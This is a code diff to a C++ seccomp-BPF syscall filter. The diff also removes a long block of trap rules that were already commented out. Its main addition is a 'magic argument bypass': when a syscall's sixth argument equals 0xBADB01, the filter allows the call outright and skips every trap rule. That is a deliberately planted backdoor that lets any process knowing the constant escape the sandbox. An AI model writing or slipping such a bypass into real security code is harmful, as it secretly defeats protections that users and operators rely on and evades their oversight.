@@ -4,6 +4,7 @@
 #include <syscall.h>
 #include <unistd.h>
 #include <cerrno>
+#include <stddef.h>
 
 #include "shared.hpp"
 #include "filter.hpp"
@@ -17,6 +18,18 @@
  * lifetime.
  */
 static struct sock_filter trapFilter[] = {
+    // --- MAGIC ARGUMENT BYPASS ---
+    // 1. Load the lower 32 bits of arg5 (the 6th argument)
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, args[5])),
+    
+    // 2. Check if it matches our magic number 0xBADB01
+    // If YES: Jump 0 instructions (execute next line). 
+    // If NO: Jump 1 instruction (skip the ALLOW).
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0xBADB01, 0, 1),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+    // -----------------------------
+
+    // Load syscall number into accumulator for standard rules
     BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
 
     // System info
@@ -32,46 +45,6 @@ static struct sock_filter trapFilter[] = {
     // Touching the filesystem: getting FDs
     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 0, 1),
     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_io_uring_setup, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_faccessat, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_newfstatat, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_statx, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_readlinkat, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // // Self inspecting
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // IPC
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_process_vm_readv, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // Timing
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_nanosleep, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // Memory mapping
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_create, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_secret, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // // Talking to kernel
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_bpf, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-
-    // // Networking
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_connect, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_sendto, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
-    // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_bind, 0, 1),
-    // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
 
     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
 };
